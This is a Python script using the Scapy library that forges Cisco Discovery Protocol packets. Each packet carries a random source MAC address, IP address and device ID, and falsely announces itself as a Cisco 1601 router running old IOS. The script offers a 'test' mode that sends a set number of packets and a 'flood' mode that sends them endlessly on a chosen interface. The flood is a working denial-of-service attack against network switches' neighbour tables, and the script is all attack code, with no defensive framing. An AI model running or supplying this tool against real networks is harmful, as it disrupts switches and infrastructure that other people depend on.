#!/usr/bin/python3

import sys
import argparse
from scapy.all import *
from colorama import Fore, Back
import string
import yaml

load_contrib('cdp') # to use the CDP protocol

global GREEN, RED, YELLOW, MAGENTA, RESET
GREEN = Fore. GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
MAGENTA = Fore.MAGENTA
RESET = Fore.RESET



def cdpDeviceIDgen(size=2, chars=string.ascii_uppercase + string.digits + string.ascii_lowercase):
    return ''.join(random.choice(chars) for x in range(size))


def cdppacketgen():

#    with open(packet_struct_path, mode='r') as fp:
#        config = yaml.load(fp)
#
#    etherframe      = Ether()                       #Start definition of Ethernet Frame
#    etherframe.dst  = config['etherframe_dst']      #Set Ethernet Frame destination MAC to Ciscos Broadcast MAC
#    if config['etherframe_src'] == "RandMAC":
#        etherframe.src  = RandMAC()                     #Set Random source MAC address
#    else:
#        etherframe.src = config['etherframe_src']
#    etherframe.type = config['etherframe_type']                       #CDP uses Type field for length information
#    
#    llcFrame      = LLC()                           #Start definition of Link Layer Control Frame
#    llcFrame.dsap = config['llcFrame_dsap']                             #DSAP: SNAP (0xaa) IG Bit: Individual
#    llcFrame.ssap = config['llcFrame_ssap']                             #SSAP: SNAP (0xaa) CR Bit: Command
#    llcFrame.ctrl = config['llcFrame_ctrl']                               #Control field Frame Type: Unumbered frame (0x03)
#    
#    snapFrame      = SNAP()                         #Start definition of SNAP Frame (belongs to LLC Frame)
#    snapFrame.OUI  = config['snapFrame_OUI']                             #Organization Code: Cisco hex(0x00000c) = int(12)
#    snapFrame.code = config['snapFrame_code']                           #PID (EtherType): CDP hex(0x2000) = int(8192)
#    
#    cdpHeader      = CDPv2_HDR()                    #Start definition of CDPv2 Header
#    cdpHeader.vers = config['cdpHeader_vers']                              #CDP Version: 1 - its always 1
#    cdpHeader.ttl  = config['cdpHeader_ttl']                            #TTL: 180 seconds
#    
#    cdpDeviceID      = CDPMsgDeviceID()             #Start definition of CDP Message Device ID
#    cdpDeviceID.type = config['cdpDeviceID_type']                            #Type: Device ID hex(0x0001) = int(1)
#    cdpDeviceID.len  = config['cdpDeviceID_len']                            #Length: 6 (Type(2) -> 0x00 0x01) + (Length(2) -> 0x00 0x0c) + (DeviceID(2))
#    cdpDeviceID.val  = cdpDeviceIDgen()             #Generate random Device ID (2 chars uppercase + int = lowercase)
#    
#    cdpAddrv4         = CDPAddrRecordIPv4()         #Start Address Record information for IPv4 belongs to CDP Message Address
#    cdpAddrv4.ptype   = config['cdpAddrv4_ptype']                           #Address protocol type: NLPID
#    cdpAddrv4.plen    = config['cdpAddrv4_plen']                           #Protocol Length: 1
#    cdpAddrv4.proto   = b'\xcc'                      #Protocol: IP
#    cdpAddrv4.addrlen = config['cdpAddrv4_addrlen']                           #Address length: 4 (e.g. int(192.168.1.1) = hex(0xc0 0xa8 0x01 0x01)
#    if config['cdpAddrv4_addr'] == 'RandIP':
#        cdpAddrv4.addr    = str(RandIP())               #Generate random source IP address
#    else:
#        cdpAddrv4.addr = config['cdpAddrv4_addr']
#    
#    cdpAddr       = CDPMsgAddr()                    #Start definition of CDP Message Address
#    cdpAddr.type  = config['cdpAddr_type']                               #Type: Address (0x0002)
#    cdpAddr.len   = config['cdpAddr_len']                              #Length: hex(0x0011) = int(17)
#    cdpAddr.naddr = config['cdpAddr_naddr']                               #Number of addresses: hex(0x00000001) = int(1)
#    if config['cdpAddr_addr'] == 'cdpAddrv4':
#        cdpAddr.addr  = [cdpAddrv4]                     #Pass CDP Address IPv4 information
#    else:
#        cdpAddr.addr = config['cdpAddr_addr']
#    
#    cdpPortID       = CDPMsgPortID()                #Start definition of CDP Message Port ID
#    cdpPortID.type  = config['cdpPortID_type']                             #type: Port ID (0x0003)
#    cdpPortID.len   = config['cdpPortID_len']                            #Length: 13
#    cdpPortID.iface = config['cdpPortID_iface']                   #Interface string (can be changed to what you like - dont forget the length field)
#    
#    cdpCapabilities        = CDPMsgCapabilities()   #Start definition of CDP Message Capabilities
#    cdpCapabilities.type   = config['cdpCapabilities_type']                     #Type: Capabilities (0x0004)
#    cdpCapabilities.length = config['cdpCapabilities_length']                      #Length: 8
#    cdpCapabilities.cap    = config['cdpCapabilities_cap']                      #Capability: Router (0x01), TB Bridge (0x02), SR Bridge (0x04), Switch that provides both Layer 2 and/or Layer 3 switching (0x08), Host (0x10), IGMP conditional filtering (0x20) and Repeater (0x40)
#    
#    cdpSoftVer      = CDPMsgSoftwareVersion()       #Start definition of CDP Message Software Version
#    cdpSoftVer.type = config["cdpSoftVer_type"]                             #Type: Software Version (0x0005)
#    cdpSoftVer.len  = config["cdpSoftVer_len"]                           #Length: 216
#    cdpSoftVer.val  = config["cdpSoftVer_val"]
#    
#    cdpPlatform      = CDPMsgPlatform()             #Statr definition of CDP Message Platform
#    cdpPlatform.type = config["cdpPlatform_type"]                            #Type: Platform (0x0006)
#    cdpPlatform.len  = config["cdpPlatform_len"]                           #Length: 14
#    cdpPlatform.val  = config["cdpPlatform_val"]                 #Platform = cisco 1601 (can be changed, dont forget the Length)

    etherframe      = Ether()                       #Start definition of Ethernet Frame
    etherframe.dst  = '01:00:0c:cc:cc:cc'           #Set Ethernet Frame destination MAC to Ciscos Broadcast MAC
    etherframe.src  = RandMAC()                     #Set Random source MAC address
    etherframe.type = 0x011e                        #CDP uses Type field for length information

    llcFrame      = LLC()                           #Start definition of Link Layer Control Frame
    llcFrame.dsap = 170                             #DSAP: SNAP (0xaa) IG Bit: Individual
    llcFrame.ssap = 170                             #SSAP: SNAP (0xaa) CR Bit: Command
    llcFrame.ctrl = 3                               #Control field Frame Type: Unumbered frame (0x03)

    snapFrame      = SNAP()                         #Start definition of SNAP Frame (belongs to LLC Frame)
    snapFrame.OUI  = 12                             #Organization Code: Cisco hex(0x00000c) = int(12)
    snapFrame.code = 8192                           #PID (EtherType): CDP hex(0x2000) = int(8192)

    cdpHeader      = CDPv2_HDR()                    #Start definition of CDPv2 Header
    cdpHeader.vers = 1                              #CDP Version: 1 - its always 1
    cdpHeader.ttl  = 180                            #TTL: 180 seconds

    cdpDeviceID      = CDPMsgDeviceID()             #Start definition of CDP Message Device ID
    cdpDeviceID.type = 1                            #Type: Device ID hex(0x0001) = int(1)
    cdpDeviceID.len  = 6                            #Length: 6 (Type(2) -> 0x00 0x01) + (Length(2) -> 0x00 0x0c) + (DeviceID(2))
    cdpDeviceID.val  = cdpDeviceIDgen()             #Generate random Device ID (2 chars uppercase + int = lowercase)

    cdpAddrv4         = CDPAddrRecordIPv4()         #Start Address Record information for IPv4 belongs to CDP Message Address
    cdpAddrv4.ptype   = 1                           #Address protocol type: NLPID
    cdpAddrv4.plen    = 1                           #Protocol Length: 1
    cdpAddrv4.proto   = b'\xcc'                      #Protocol: IP
    cdpAddrv4.addrlen = 4                           #Address length: 4 (e.g. int(192.168.1.1) = hex(0xc0 0xa8 0x01 0x01)
    cdpAddrv4.addr    = str(RandIP())               #Generate random source IP address

    cdpAddr       = CDPMsgAddr()                    #Start definition of CDP Message Address
    cdpAddr.type  = 2                               #Type: Address (0x0002)
    cdpAddr.len   = 17                              #Length: hex(0x0011) = int(17)
    cdpAddr.naddr = 1                               #Number of addresses: hex(0x00000001) = int(1)
    cdpAddr.addr  = [cdpAddrv4]                     #Pass CDP Address IPv4 information

    cdpPortID       = CDPMsgPortID()                #Start definition of CDP Message Port ID
    cdpPortID.type  = 3                             #type: Port ID (0x0003)
    cdpPortID.len   = 13                            #Length: 13
    cdpPortID.iface = 'Ethernet0'                   #Interface string (can be changed to what you like - dont forget the length field)

    cdpCapabilities        = CDPMsgCapabilities()   #Start definition of CDP Message Capabilities
    cdpCapabilities.type   = 4                      #Type: Capabilities (0x0004)
    cdpCapabilities.length = 8                      #Length: 8
    cdpCapabilities.cap    = 1                      #Capability: Router (0x01), TB Bridge (0x02), SR Bridge (0x04), Switch that provides both Layer 2 and/or Layer 3 switching (0x08), Host (0x10), IGMP conditional filtering (0x20) and Repeater (0x40)

    cdpSoftVer      = CDPMsgSoftwareVersion()       #Start definition of CDP Message Software Version
    cdpSoftVer.type = 5                             #Type: Software Version (0x0005)
    cdpSoftVer.len  = 216                           #Length: 216
    cdpSoftVer.val  = 'Cisco Internetwork Operating System Software \nIOS (tm) 1600 Software (C1600-NY-L), Version 11.2(12)P, RELEASE SOFTWARE (fc1)\nCopyright (c) 1986-1998 by cisco Systems, Inc.\nCompiled Tue 03-Mar-98 06:33 by dschwart'

    cdpPlatform      = CDPMsgPlatform()             #Statr definition of CDP Message Platform
    cdpPlatform.type = 6                            #Type: Platform (0x0006)
    cdpPlatform.len  = 14                           #Length: 14
    cdpPlatform.val  = 'cisco 1601'                 #Platform = cisco 1601 (can be changed, dont forget the Length)

    
    
    #Assemble Packet
    cdppacket = etherframe/llcFrame/snapFrame/cdpHeader/cdpDeviceID/cdpAddr/cdpPortID/cdpCapabilities/cdpSoftVer/cdpPlatform
    return cdppacket



def cdp_flood(attack, num_req):


    if attack == "test":
        print(GREEN + "[+] send "+ str(num_req)  +" CDP packets" + RESET)
        for i in range(0,num_req):
            try:
                packet = cdppacketgen()
                sendp(packet, verbose=False, iface=net_interface)
            except Exception as e:
                print(str(e))

    elif attack == "flood":
        print(GREEN + "[+] send continuously CDP packets" + RESET)
        while True:
            packet = cdppacketgen()
            sendp(packet, verbose=False, iface=net_interface)

    return True




parser = argparse.ArgumentParser()
parser.add_argument("-t", "--type", help="test/flood")
parser.add_argument("-N", "--num_req", help="number of request")
parser.add_argument("-I", "--interface", help="interface(eth0, ...)")
parser.add_argument("-s", "--struct", help="packet structure path for CDP")
args = parser.parse_args()

if args.type:
    type_attack = args.type # flood / test


    if type_attack == "test":
        if args.num_req:
            num_request = int(args.num_req)
        else:
            num_request = 5
    else:
        num_request = 0 # means infinity of requests

    if args.struct:
        global packet_struct_path
        packet_struct_path = args.struct
    else:
        print("[-] miss the CDP structure path")
        sys.exit(1)

    global net_interface
    if args.interface:
        net_interface = args.interface
    else:
        net_interface = "eth0"

    cdp_flood(type_attack, num_request)
else:
    print(RED + "[-] read the help .." + RESET)



sys.exit(1)
